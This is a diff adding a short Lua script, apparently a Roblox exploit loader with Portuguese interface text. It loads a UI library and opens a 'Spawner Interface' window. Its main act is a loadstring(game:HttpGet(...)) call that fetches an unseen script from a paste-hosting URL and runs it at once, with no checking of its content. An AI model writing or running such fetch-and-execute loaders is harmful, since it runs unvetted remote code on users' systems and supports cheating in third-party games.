@@ -1,0 +1,21 @@
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
+
+local Window = Rayfield:CreateWindow({
+    Name = "Spawner Interface",
+    LoadingTitle = "Carregando...",
+    LoadingSubtitle = "Por favor, aguarde.",
+    ConfigurationSaving = { Enabled = false }
+})
+
+local SpawnerTab = Window:CreateTab("Spawner", nil)
+
+SpawnerTab:CreateLabel("Script Spawner carregado e executado.")
+
+-- Executa o script externo imediatamente (100%)
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/sVuOeRZ2NofshWSx/raw"))()
+end)
+
+if not success then
+    SpawnerTab:CreateLabel("Erro ao executar script: "..err)
+end
